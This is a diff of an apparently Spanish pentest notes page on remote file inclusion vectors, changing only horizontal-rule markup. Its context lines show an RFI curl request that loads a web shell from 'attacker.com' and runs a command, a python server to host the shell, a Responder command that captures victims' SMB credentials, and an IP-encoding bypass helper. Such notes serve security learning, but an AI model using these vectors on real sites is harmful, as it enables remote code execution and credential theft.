@@ -17,7 +17,7 @@ linked:
 ---
 # RFI - Vectores Básicos
 
-***
+---
 
 ## HTTP / HTTPS Remote Inclusion
 
@@ -56,7 +56,7 @@ cd /tmp/rfi && python3 -m http.server 80
 # curl 'https://target/index.php?page=http://attacker.com/shell.php&c=id'
 ```
 
-___
+---
 
 ## FTP / SMB Schemes
 
@@ -76,7 +76,7 @@ ___
 | `responder -I eth0 -wrf` (capture credentials via SMB) | Responder SMB capture victim creds | Adjacent SMB. |
 ^rfi-vector-ftp
 
-___
+---
 
 ## Raw URL Inclusion
 
@@ -98,7 +98,7 @@ ___
 | `python3 -c "import socket; print(int.from_bytes(socket.inet_aton('192.168.1.1'),'big'))"` | Calculate decimal IP for bypass | Encode helper. |
 ^rfi-vector-raw
 
-___
+---
 
 ## Combine con Local Upload
 
@@ -117,4 +117,4 @@ ___
 | Burp Repeater intercept upload → modify filename → forward | Manual upload chain | Workflow. |
 ^rfi-vector-local-upload
 
-***
+---
